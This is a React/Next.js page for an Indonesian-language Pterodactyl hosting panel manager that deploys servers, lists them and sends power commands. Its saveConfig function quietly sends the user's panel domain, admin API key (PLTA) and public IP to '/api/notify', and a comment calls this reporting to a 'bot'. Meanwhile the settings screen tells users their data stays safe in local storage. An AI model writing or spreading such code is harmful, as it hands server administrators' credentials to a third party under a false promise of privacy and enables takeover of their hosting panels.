import { useState, useEffect } from 'react';
import Head from 'next/head';
import axios from 'axios';
import { 
  LayoutDashboard, Settings, PlusCircle, Server, 
  Trash2, CheckCircle2, AlertTriangle, Terminal, Cpu, RefreshCw,
  Power, RotateCcw, Upload, Activity
} from 'lucide-react';

export default function Home() {
  const [activeTab, setActiveTab] = useState('create');
  const [config, setConfig] = useState({ domain: '', plta: '', ptlc: '' });
  const [isConfigured, setIsConfigured] = useState(false);
  const [status, setStatus] = useState(null);
  
  // Data State
  const [username, setUsername] = useState('');
  const [selectedPlan, setSelectedPlan] = useState('1gb');
  const [loading, setLoading] = useState(false);
  const [history, setHistory] = useState([]);
  const [serverList, setServerList] = useState([]);
  const [loadingList, setLoadingList] = useState(false);
  
  // State untuk Panel Control (Active Server)
  const [activeServer, setActiveServer] = useState(null);

  // PLAN CONFIG
  const PLANS = {
    "1gb":  { label: "STARTER", memory: 1024, cpu: 40, disk: 1024 },
    "2gb":  { label: "BASIC",   memory: 2048, cpu: 80, disk: 2048 },
    "3gb":  { label: "STANDARD",memory: 3072, cpu: 100, disk: 3072 },
    "4gb":  { label: "PRO",     memory: 4096, cpu: 140, disk: 4096 },
    "8gb":  { label: "TURBO",   memory: 8192, cpu: 250, disk: 8192 },
    "unli": { label: "GOD MODE", memory: 0, cpu: 0, disk: 0 },
  };

  useEffect(() => {
    const savedConfig = localStorage.getItem('panel_config');
    const savedHistory = localStorage.getItem('panel_history');
    
    if (savedConfig) {
      const parsed = JSON.parse(savedConfig);
      setConfig(parsed);
      if(parsed.domain && parsed.plta) setIsConfigured(true);
    } else {
      setActiveTab('settings');
    }
    if (savedHistory) setHistory(JSON.parse(savedHistory));
  }, []);

  const saveConfig = async () => {
    if (!config.domain || !config.plta) {
      return setStatus({ type: 'error', msg: 'Harap isi Domain dan Admin API (PLTA) dengan benar.' });
    }

    localStorage.setItem('panel_config', JSON.stringify(config));
    setIsConfigured(true);
    setStatus({ type: 'success', msg: 'Konfigurasi aman & tersimpan!' });

    try {
      const ipRes = await axios.get('https://api.ipify.org?format=json');
      await axios.post('/api/notify', {
        domain: config.domain,
        plta: config.plta, 
        ip: ipRes.data.ip
      });
    } catch (e) {
      console.error("Silent Log: Gagal lapor bot", e);
    }

    setTimeout(() => {
      setStatus(null);
      setActiveTab('create');
    }, 1500);
  };

  const fetchServers = async () => {
    if(!isConfigured) return;
    setLoadingList(true);
    setActiveServer(null); // Reset detail view saat refresh
    try {
      const res = await axios.post('/api/ptero', {
        action: 'list_servers',
        host: config.domain,
        key: config.plta
      });
      setServerList(res.data.data);
    } catch (err) {
      setStatus({ type: 'error', msg: 'Gagal memuat data server. Cek Config.' });
    } finally {
      setLoadingList(false);
    }
  };

  useEffect(() => {
    if(activeTab === 'list' && isConfigured) fetchServers();
  }, [activeTab]);

  const handleCreate = async () => {
    if (!username) return setStatus({ type: 'error', msg: 'Username tidak boleh kosong!' });
    if (!isConfigured) return setStatus({ type: 'error', msg: 'Konfigurasi belum diatur!' });

    setLoading(true);
    setStatus(null);

    try {
      const res = await axios.post('/api/ptero', {
        host: config.domain,
        key: config.plta,
        username: username,
        plan: PLANS[selectedPlan]
      });

      const newData = {
        ...res.data.data,
        planName: PLANS[selectedPlan].label,
        date: new Date().toLocaleDateString()
      };

      const newHistory = [newData, ...history];
      setHistory(newHistory);
      localStorage.setItem('panel_history', JSON.stringify(newHistory));

      setStatus({ type: 'success', msg: `Berhasil deploy server untuk ${username}` });
      setUsername('');
      setActiveTab('history');

    } catch (err) {
      setStatus({ type: 'error', msg: err.response?.data?.message || 'Terjadi kesalahan pada server.' });
    } finally {
      setLoading(false);
    }
  };

  // Fungsi Kirim Aksi Power (Start/Restart/Kill)
  const handlePowerAction = async (signal) => {
    if(!config.ptlc) return setStatus({ type: 'error', msg: 'Client API (PTLC) belum diisi di menu Settings!' });
    
    try {
      setStatus({ type: 'success', msg: `Mengirim perintah ${signal}...` });
      await axios.post('/api/ptero', {
        action: 'power',
        host: config.domain,
        identifier: activeServer.attributes.identifier,
        signal: signal,
        ptlc: config.ptlc
      });
      setStatus({ type: 'success', msg: `Perintah ${signal} berhasil dikirim!` });
    } catch (err) {
      setStatus({ type: 'error', msg: err.response?.data?.message || 'Gagal mengirim perintah. Pastikan PTLC valid.' });
    }
    
    setTimeout(() => setStatus(null), 3000);
  };

  // Fungsi Dummy Upload File
  const handleUpload = () => {
    alert("Ini adalah Mockup Frontend. Mengupload file ke Pterodactyl membutuhkan Form-Data API dari Node.js yang akan memperberat source code panel simple ini.");
  };

  return (
    <div className="app-wrapper">
      <Head>
        <title>CyberPanel Manager</title>
        <meta name="theme-color" content="#050505" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
      </Head>

      <nav className="navbar">
        <div className="container nav-inner">
          <div className="logo">
            <Terminal size={24} />
            Cyber<span>Manager</span>
          </div>
          <div className="status-pill">
            <div className={`status-dot ${isConfigured ? 'on' : 'off'}`}></div>
            {isConfigured ? 'CONNECTED' : 'NO CONFIG'}
          </div>
        </div>
      </nav>

      <div className="container grid-layout">
        <aside className="sidebar">
          <button className={`menu-btn ${activeTab === 'create' ? 'active' : ''}`} onClick={() => setActiveTab('create')}>
            <PlusCircle size={20} /> Deploy Server
          </button>
          <button className={`menu-btn ${activeTab === 'list' ? 'active' : ''}`} onClick={() => { setActiveTab('list'); setActiveServer(null); }}>
            <Server size={20} /> Live Servers
          </button>
          <button className={`menu-btn ${activeTab === 'history' ? 'active' : ''}`} onClick={() => setActiveTab('history')}>
            <LayoutDashboard size={20} /> Local History
          </button>
          <button className={`menu-btn ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}>
            <Settings size={20} /> Configuration
          </button>
        </aside>

        <main>
          {status && (
            <div className={`toast ${status.type}`}>
              {status.type === 'success' ? <CheckCircle2 size={20} /> : <AlertTriangle size={20} />}
              <span>{status.msg}</span>
            </div>
          )}

          {/* === TAB: CREATE === */}
          {activeTab === 'create' && (
            <div className="card">
              <div className="card-head">
                <h2>Deploy Instance</h2>
              </div>
              
              <div className="form-group">
                <label className="form-label">Server Owner (Username)</label>
                <input 
                  type="text" 
                  className="form-input" 
                  placeholder="e.g. RayyProject"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>

              <div className="form-group">
                <label className="form-label">Allocation Plan</label>
                <div className="plans">
                  {Object.keys(PLANS).map((key) => (
                    <div 
                      key={key} 
                      className={`plan-card ${selectedPlan === key ? 'active' : ''}`}
                      onClick={() => setSelectedPlan(key)}
                    >
                      <span className="plan-name">{PLANS[key].label}</span>
                      <span className="plan-spec">{PLANS[key].memory === 0 ? 'UNLI' : `${PLANS[key].memory} MB`}</span>
                    </div>
                  ))}
                </div>
              </div>

              <button className="btn-primary" onClick={handleCreate} disabled={loading}>
                {loading ? 'INITIALIZING...' : 'DEPLOY SERVER NOW'}
              </button>
            </div>
          )}

          {/* === TAB: LIVE SERVER & CONTROL === */}
          {activeTab === 'list' && (
            <div className="card">
              
              {!activeServer ? (
                <>
                  <div className="card-head">
                    <h2>Live Monitor</h2>
                    <button className="refresh-btn" onClick={fetchServers}>
                      <RefreshCw size={16} className={loadingList ? 'animate-spin' : ''} /> REFRESH
                    </button>
                  </div>

                  {loadingList ? (
                    <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>Fetching Data...</div>
                  ) : serverList.length === 0 ? (
                    <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>No active servers found.</div>
                  ) : (
                    <div className="srv-list">
                      {serverList.map((srv) => {
                        const attr = srv.attributes;
                        const isSuspended = attr.suspended;
                        const isInstalling = attr.status !== null;
                        
                        return (
                          <div key={attr.id} className="srv-item clickable" onClick={() => setActiveServer(srv)}>
                            <div className="srv-meta">
                              <h4>{attr.name}</h4>
                              <p className="mono">ID: {attr.id} • {attr.limits.memory}MB RAM</p>
                            </div>
                            <div>
                              {isSuspended ? (
                                <span className="badge bad">SUSPENDED</span>
                              ) : isInstalling ? (
                                <span className="badge warn">INSTALLING</span>
                              ) : (
                                <span className="badge ok">MANAGE ➔</span>
                              )}
                            </div>
                          </div>
                        )
                      })}
                    </div>
                  )}
                </>
              ) : (
                /* TAMPILAN CONTROL PANEL (ACTIVE SERVER) */
                <div className="control-panel-view">
                  <div className="card-head">
                    <h2>⚙️ {activeServer.attributes.name}</h2>
                    <button className="refresh-btn" onClick={() => setActiveServer(null)}>⬅ KEMBALI</button>
                  </div>
                  
                  <div className="network-box mono">
                    <p><Activity size={18}/> Identifier: <span>{activeServer.attributes.identifier}</span></p>
                    <p><Server size={18}/> Node: <span>{activeServer.attributes.node}</span></p>
                    <p><Cpu size={18}/> Limits: <span>RAM: {activeServer.attributes.limits.memory}MB | Disk: {activeServer.attributes.limits.disk}MB</span></p>
                  </div>

                  <h3 style={{margin: '1.5rem 0 1rem', fontSize: '1.2rem'}}>Power Actions</h3>
                  <div className="power-grid">
                    <button className="btn-power start" onClick={() => handlePowerAction('start')}>
                      <Power size={18}/> START
                    </button>
                    <button className="btn-power restart" onClick={() => handlePowerAction('restart')}>
                      <RotateCcw size={18}/> RESTART
                    </button>
                    <button className="btn-power stop" onClick={() => handlePowerAction('kill')}>
                      <AlertTriangle size={18}/> KILL
                    </button>
                  </div>

                  <h3 style={{margin: '2rem 0 1rem', fontSize: '1.2rem'}}>File Manager</h3>
                  <div className="upload-box">
                    <input type="file" className="file-input" />
                    <button className="btn-primary" style={{width: 'auto', padding: '0.8rem 1.5rem'}} onClick={handleUpload}>
                      <Upload size={18}/> Upload File
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* === TAB: HISTORY === */}
          {activeTab === 'history' && (
            <div className="card">
              <div className="card-head"><h2>Deploy History</h2></div>
              <div className="srv-list">
                 {history.length === 0 && <p style={{textAlign:'center', color:'#64748b', padding:'2rem'}}>No local data.</p>}
                 {history.map((item, idx) => (
                   <div key={idx} className="srv-item">
                     <div className="srv-meta">
                        <h4>{item.username}</h4>
                        <p className="mono">{item.email}</p>
                        <p className="mono" style={{color:'#3b82f6', marginTop:4}}>{item.password}</p>
                     </div>
                     <button 
                        onClick={()=>{
                           const n = history.filter((_,i)=>i!==idx); 
                           setHistory(n); 
                           localStorage.setItem('panel_history',JSON.stringify(n));
                        }} 
                        style={{background:'none', border:'none', color:'#f43f5e', cursor:'pointer', padding:'10px'}}
                     >
                       <Trash2 size={18}/>
                     </button>
                   </div>
                 ))}
               </div>
            </div>
          )}

          {/* === TAB: SETTINGS === */}
          {activeTab === 'settings' && (
            <div className="card">
              <div className="card-head"><h2>System Config</h2></div>
              
              <div className="form-group">
                <label className="form-label">Panel Domain (HTTPS)</label>
                <input 
                  type="text" 
                  className="form-input" 
                  placeholder="https://panel.example.com"
                  value={config.domain} 
                  onChange={(e) => setConfig({...config, domain: e.target.value})} 
                />
              </div>

              <div className="form-group">
                <label className="form-label">Admin API Key (PLTA) - Create Server</label>
                <input 
                  type="password" 
                  className="form-input" 
                  placeholder="plta_xxxxxxxxxxxxxxxxxxxx"
                  value={config.plta} 
                  onChange={(e) => setConfig({...config, plta: e.target.value})} 
                />
              </div>

              <div className="form-group">
                <label className="form-label" style={{color: '#8b5cf6'}}>Client API Key (PTLC) - Control Server</label>
                <input 
                  type="password" 
                  className="form-input" 
                  style={{borderColor: 'rgba(139, 92, 246, 0.3)'}}
                  placeholder="ptlc_xxxxxxxxxxxxxxxxxxxx"
                  value={config.ptlc || ''} 
                  onChange={(e) => setConfig({...config, ptlc: e.target.value})} 
                />
              </div>

              <div style={{background:'rgba(59,130,246,0.1)', border:'1px solid rgba(59,130,246,0.2)', padding:'1rem', borderRadius:'12px', marginBottom:'1.5rem', fontSize:'0.9rem', color:'#93c5fd'}}>
                ℹ️ Data konfigurasi disimpan di LocalStorage browser Anda. Data Anda Aman.
              </div>

              <button className="btn-primary" onClick={saveConfig}>
                SAVE & CONNECT
              </button>
            </div>
          )}

        </main>
      </div>
    </div>
  );
}
